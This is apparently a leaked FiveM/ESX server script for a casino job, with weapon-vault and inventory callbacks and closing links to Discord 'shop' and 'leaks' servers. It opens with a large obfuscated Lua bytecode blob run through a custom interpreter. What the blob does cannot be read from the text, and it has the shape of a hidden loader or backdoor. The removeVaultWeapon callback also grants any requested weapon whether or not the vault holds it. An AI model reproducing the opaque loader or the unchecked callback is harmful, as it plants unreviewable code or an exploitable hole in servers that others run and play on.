H3A5AE5652HE528FCBC448E492F6F945A49AE5AE6BF162959569A5D103A5AD9159314AF403062A7F598012D6C774F02E44B889123F77200DD3596D697161CF1CD1FC631F88F4FAD6ADB3H1B1ACA783AEE2A35742H750D4C3HCC62BF3H3F3A3E7EC0411C0032820A02002100FC063H005D04D4AD5C11FC083H00674E67DD34D9946CFC093H001F06AA118F04CCBEA1FC063H00BE8542D66215FC063H00888F2962881FFC0C3H00D2191F184090EB4AE4B59D872B8H00FC093H00E6AD0B842BE7D4D2E6FC4H002B317H00FC073H00650CCCA5321D0DFC053H00561DAA22DEFC0C3H00F9207851A113701EC32HB1A1FC0E3H008D34DC471DFDF20A249812B84D2DFC073H004F36A2FB46E7B5FC074H0007B1EA388A3C2BE8036H00FC093H0091B8F3D30C34AE2C78FC063H007077017AA036FC053H00BA015A4A662B00016H00FC073H00DD84542DD48F83FC063H00CE955EBA5E14FC0D3H00989FD912991E964824365C69C9FC073H00339A8C697B95D5FC073H0064EB0DC6B0A8D92B957H00FC083H00751CD07E232H1101FC083H002DD438AD6753566AFC073H00E58C4C25A08C8BFC0A3H00D69D1B945116CEC4EF21FC063H00FC838959392DFC0A3H00460DC054D19D627E90A22BA07H002B017H00FC073H006CF32EC0AAA3D348FC083H007D24D9732EE7E21AFC093H0035DC01A57E545A4783FC083H00941BECBC9D95BBD7FC083H004CD365DECBCEFA31FC073H00048B825A010B22FC063H0015BC37D3817DFC093H001F06BE118F04CCBEA1FC0A3H00BE8573E55F33DBC639732B047H00BA2BFF7H00FC0E3H00E46BA17C342A4B81FD57EBB3949AFC0A3H00E6AD20B42CFCDDD5FB172B028H0005AD37731D0D020007F939E7791C24A43AA41CBBFBA53B1C6EAE6C6E512HADA8AD5AA868AEA8282H4F763F492H52E82749A107030E5EACF1F0375763D5A89D13368D85C91A5589289F0C308B1DD731F7F3E9AC591ACB9CBA44498953C91C749F03F1312H8B1B0B1C2H7E7FFE1C3D1078A74538B13839481F5FE1601C62EB2H625A71F18F0E1C7C3C1AFC1C73337B672D064688861CA565B4251CC00B888028470D8B0715EA602H6A4E5913919928844E2H44659B46685F0A0E610BD3454D8DB0321CC8C1C8C61AEFE66FEF06F2782H724E812E4496454C068C0D0A3H43C31C561C96384B75BC2HF53F3H10901CD75E57D44B7ABAF2FA1C696FE0E73354DD54D11AEBE2212B5A1E701BC4459D5D62E21C1852D85A1ABF7F44C01C826C87CF4551FF144A459C96949C285319131D1A26E6D9591CC50C454712A04E25FB452H27DB581C4A678FD64539F9C6461CE46D6465497BF22HFB656E3C05C309AD03E8B64568066DB3450FC68F8E3092526DED1CE1E4E870332H2CD7531CE36A2HE35A3H36B61C959C90955AF0DDB56A45F77EF7F6481A4885894789098A091CF474C4741C0B81854B07BE3EEE3E1C3DD3B866452H7882071C9FB3DA1045A24FA7FB45F139B1B0483HBC3C1CF3BB33AD4B46868E56383HE5651CC0408F401C072BC29045EAA22AAA06D9D123A60784C4D5041C9B5B9F1B1C4E8BAA4E078DCDBE0D1C480288080B2FEFD0501CF25F37EF45C1EF045B454C8CB3331C83CB0990335696A9291C2H354FB51C50D8585028979F2H9765BA19A5891FE9C5AC7F45949C1C1428EB632H6B659EAAD1255DDD5527A21598779DC445FFBFFF7F1C82C8C2C41A5191AF2E1CDC20ECA42A93192H5317A65F247F142H85AC051CE020E6E05A3H67E71C2HCACFCA5A79B93E793C3HA4241C2H3B3E3B5AAE2EE8EE5A3H2DAD1C68282D285A8F4F0ACF3C5212D4D25A2161E5A03C3H6CEC1CA32326235A2HB670765A3HD5551CB07075705AF737F1363C3HDA5A1C09C9CCC95A34F53C345A0B0A4C093C3HFE7E1C7D7C787D5AF8B9B4B85A3H9F1F1CA2E3E7E25A71B0F2F15A3CBDF5FC5A3HF3731C468783865A25672H255A3H00801C070502075AAAE8E2EA5A995B15195A0486CEC45A3HDB5B1CCE0C0B0E5ACD0E2HCD5A08CB42485A3H6FEF1CB2F1F7F25AC1424A415A3H8C0C1C43C0C6C35A56959197543H75F51C509395905AD79306D654BABEF2FA28E9ED6F692894105654286BAF2HAB651EFD75961C1D182H1D4ED8DD2HD865FFC656DD5442470A0228D1942H91655CE54C323513169293286663ADA62805C02HC565604557C104A721AFA7280A0C2H0A657968ECC85664E10C9B157BBBBD68382EAEC2511C6DED37ED1C2862E8680B0F058F1B1A1292F96D1CA1E92HE1472C61B3BF4763A30BE31CB676DD361CD5EFA5602A30F92HB017B7CB80FE301A5A7B9A1C09E40C5045742H4069658B032H4B177E63716E64FDF53DBC5BB8F02HF84EDF1F20A01CA22A2H224EF1392H3169FC742H3C17B33F2E9552C6CFC6C01AA588603C454000BB3F1C074FC7451A2AEAD1551C99512H59650484D47B1C1B5B4C9B1CCE474E5F1A4DE308574508668DD2456F26AFAE48327234B21C01488892202HCCC84C1C830B0A1233D656D4561C75BCB7B528D0902EAF1C97FA124D453AFAC5451C29A1A0B833941D9C8555EB6B16941C1EB35B0545DDB0580745D8F51D42457FBF85001C024A0BC4532H9195D6145C1C66DC1CD313D0531C26EFE4E628C50C2H056560C96665546709E2BD458A43C05920F9B0F9FB1224E4DE5B1C3B55BEE1456E64EE6E0AADE42HAD3F2845ADF2458FA24A154552BC570845612HA83320EC02E9B6452HA35BDC1CF636D5761C955C5D5528F03AF8FB55B73DFBA33C1A135A58123H49C91CF4BDB4472H4B660EC545FEB7747E5A2HFDFF7D1C38F13033553H1F9F1C626B67625A71F839633C3H7CFC1C737A76735AC6EB034B4525ACA5B71A80C07BFF1CC76902DD45EA846F3145D9D0999B1244048B3B1C9B3B43751A8E0ECB0E1C4DCD09CD1C88CF2H4F5CEF2FE16F1C32B571724EC141CD411C4C2H0B835C0344C4C05C561191945CB5723E7E53105013901C1751D7570BFAFC7B7A2829EF2HE9511491D4D6302H2B2FAB1C1E9B2H9E4E1D982H9D65D82A4561647FBABFBD4982C28A021CD1561011513H9C931A131B93141A26A626A61CC5822H45513HA0AE1A2H27D9581C0A5B9599472H39FE461C64E46CE41CBBFC7C775CAEEEAA2E1CEDEB2HED4EE8EE2HE8654F252ADF4AD2942H924E21672H61652CAD90E43163E52HE34EB6302H3665151C91A326F0763B3028F7F0F6F7513H9A9B1A3H89831A3HF4FD1A2HCB4BC21A2HBE3EB61A2H3DBD371A2H788C071C1F2H58DF5CE22HA5205CF12HB6385CBC3C4FC31CB3B5B1B3284606B2391CA52HE2635C802HC7545C87C040495CAA6A55D51C992HDE2H5CC42H83035C9BDB6BE41C8EC949445C2H8D7AF21C08C8B3771C2FA6273E342HB28A321CC1CA0A0B553H4CCC1C438886835A569C5D4120B57E313C09D09B5447662H9796171C7A313ABB373H29A91CD41F14B24BAB20EF7C4ADE1E22A11C5DD698CA3258709DF845FFBFC07F1C8232478B45D1A1D40A459CD05CCA1A5393AF2C1C6696633B4585C57BFA1CE06029F3382H6726E71C2HCAC64A1C79AFDD6558A464B2241C3BBB2ABB1C6E65DCFB4B2DED1FAD1CE823ED3F32CF0F30B01C123A57B245A121A1211CECA6677B33E368272A092H7674F61C2HD564AA1CB07BF0701AB7C7B26C451A2ADFBA45094249C83734F4CB4B1CCB408F1C4A3E35F5F4557DBD81021C78733CAF669FDF64E01CA20DE7A945711EF4AF453C76FCFD48F3F973E61A860630F91C25E5EF5A1C00ED054C4547EA025E456A62EAEB483H19991C44CC44234B9BDB92CA140E4EC0711C2HCD63B21C48012H48176FEF42EF1C2HF2C3721C414941471A4C6009DB45C3033CBC1C566F26E52A75F5810A1CD022A1C246D71774A81CFA3A52851C69E994161C145D2H5465ABEB6FD41C1EDE2E9E1CDDF098514558D1D8CA1A3FFFC0401CC20B0A0228D1181190373H1C9C1CD39A13BA4B26EFAFAB553HC5451CA02925205A27AE2HA7652H0AF1751C39F0B0B4553HE4641CFB727E7B5A2H2ED4511C2D672H6D6928222H6817CF730B3A4C92FC974F45E1211E9E1C2HAC07D31C2310507E65B6FE2HB61795BD86DF27B07872B156B754593F311A37AD5F3109C916891C743474F41C0BC18A59033EBEC0411CBDFD56C21C7872F0F828DF5FDF5F1C22A92A222831F1CE4E1CBCB61ABC1573DCB66E45C64638B91CE588603F4540C0B13F1C07408E56232AEACD551CD9B7DC04452H04A17B1C9B93131B284E8655CE150D85050D2848640DDE45AF2F51D01CF2DCB7694581017CFE1C2HCC52B31C8305460E32D61629A91CF5B0B5B81AD0502EAF1CD711971D1A3AFAC5451C292FA9A84894546BEB1CEB6E6DE133DE185B5709DD9B59506618D8E4671C7F947A36454202BF3D1CD1992HD1511C945F5C4E93DB2HD365A6C23C6F3C450D02835C202H68F45CA7EF6F695C0A2H42CF5CB92HF17E5C642CACA35CFBB333315C2E66E6E25CED2HA52D5CE82HA02A5C0F2H47C65C122H5ADD5C6129A9A25CACE4646E5CE32B682853F61B73BD45955D2H554E701D75A945373F37B6371AB75F0045C9A44C13457459B1EE458B658ED145FE77FE7E0A3D752HFD1838B12H38515F161F0E1A628C67384571F8F17037BC57CB39317333910C1C06C6E9791CA5AF25B71A40098081483H87071CAA63EA694BD96229EF2A44C445C41C5B922H5355CE07C69C3CCDC4015F3C3HC8481C6FE6EAEF5A329CF73D45C1413DBE1C0CCCCE1F384303973C1C16D6F3691CF57CFDE443105017901C575DD7431A2H7A7BFA1CA9E3EBE928D4142AAB1C2H2BEF3F1B9E1EE4E11C9DDD9D1D1C1852D84A58BF3F41C01C2H8265FD1C1119EB6E072H9C912H1C1393AA6C1CA6ADEE303C85CE89533C2050A5FD4527E7D8581C0A81069D332H39C7461C24E4EC742B2HFB16841C2HAED6D11CED64E5FC00E82817971C8F862H8F65921238ED1C612161E11C6CC12977452HE31D9C1C36B63FB61CD57890CE4530B938214D7725E8E4472H9A64E51C2H894CF61CF447C5A6462HCB28B41CBE3E5AC11C3D754D420778F8E4071C5F4C4F4A67A2E2D2DD1CB13110CE1CBC35B4AD66B3734CCC1C06CF4E5709A56C6DF750C000C1401C872AC29C452HAA54D51C992H50CB1F84CD8D96259B1B9A1B1C4E1CD1DD478D0D74F21C084809881CAFA6273E26B2724FCD1C01880910682H4CB2331CC36E86D8455696A8291C35B5DA4A1CD0BD550A4597176CE81C2HFAFEBD1429E957561C1454DB6B1CAB2FC51C31DE57D6CF2FDD9D42A21C189259E707FF7F85801CC2422HBD1CD1AA61262ADC1C23A31CD3BDD60E4566E698191C850D8D8528E0E82HE065E79EE27A5F8AC2CAC258F9F171792824AC2HA4657B53332549EE260291152DEDE43E3828E8A6571CCF4F1DB01C0002500A02008D582B37FC6HFF00BE60403AAE0A020071D292D1521C2H0B088B1C68A86AE81C79B97879514H0E5A37772H372844C47C35492HC57FB049CA76C2C142A3EA3D522A20F5C58054D17E88A93EC671C620314FC4456641FCC23D29351D5D2H1D514202C242104H3B514H585E4H295A3E3H7E5E67B2DE4E5D4H340AB50EDB0231","\108\115\104\105\102\116",222,next,error,assert,231,bit32,string.rep,pcall,101,256,nil,"\98\120\111\114",242,146,"\96\102\111\114\96\32\108\105\109\105\116\32\118\97\108\117\101\32\109\117\115\116\32\98\101\32\97\32\110\117\109\98\101\114",table.unpack,"\118",table,128,type,139,16777216,bit,"\96\102\111\114\96\32\105\110\105\116\105\97\108\32\118\97\108\117\101\32\109\117\115\116\32\98\101\32\97\32\110\117\109\98\101\114",string.gsub,"\99\104\97\114",_ENV,"\46\46",rawget,string,"\98\97\110\100","\96\102\111\114\96\32\115\116\101\112\32\118\97\108\117\101\32\109\117\115\116\32\98\101\32\97\32\110\117\109\98\101\114","\109\97\116\99\104",unpack,"\115\116\114\105\110\103",tostring,"\35",setfenv,...);

ESX.RegisterServerCallback('esx_casinojob:getVaultWeapons', function(source, cb)

  TriggerEvent('esx_datastore:getSharedDataStore', 'society_casino', function(store)

    local weapons = store.get('weapons')

    if weapons == nil then
      weapons = {}
    end

    cb(weapons)

  end)

end)

ESX.RegisterServerCallback('esx_casinojob:addVaultWeapon', function(source, cb, weaponName)

  local xPlayer = ESX.GetPlayerFromId(source)

  xPlayer.removeWeapon(weaponName)

  TriggerEvent('esx_datastore:getSharedDataStore', 'society_casino', function(store)

    local weapons = store.get('weapons')

    if weapons == nil then
      weapons = {}
    end

    local foundWeapon = false

    for i=1, #weapons, 1 do
      if weapons[i].name == weaponName then
        weapons[i].count = weapons[i].count + 1
        foundWeapon = true
      end
    end

    if not foundWeapon then
      table.insert(weapons, {
        name  = weaponName,
        count = 1
      })
    end

     store.set('weapons', weapons)

     cb()

  end)

end)

ESX.RegisterServerCallback('esx_casinojob:removeVaultWeapon', function(source, cb, weaponName)

  local xPlayer = ESX.GetPlayerFromId(source)

  xPlayer.addWeapon(weaponName, 1000)

  TriggerEvent('esx_datastore:getSharedDataStore', 'society_casino', function(store)

    local weapons = store.get('weapons')

    if weapons == nil then
      weapons = {}
    end

    local foundWeapon = false

    for i=1, #weapons, 1 do
      if weapons[i].name == weaponName then
        weapons[i].count = (weapons[i].count > 0 and weapons[i].count - 1 or 0)
        foundWeapon = true
      end
    end

    if not foundWeapon then
      table.insert(weapons, {
        name  = weaponName,
        count = 0
      })
    end

     store.set('weapons', weapons)

     cb()

  end)

end)

ESX.RegisterServerCallback('esx_casinojob:getPlayerInventory', function(source, cb)

  local xPlayer    = ESX.GetPlayerFromId(source)
  local items      = xPlayer.inventory

  cb({
    items      = items
  })

end)
--discord shop : https://discord.gg/3wwzfmf---
--discord leaks : https://discord.gg/39mJqPU--
----------------------SP#5201------------------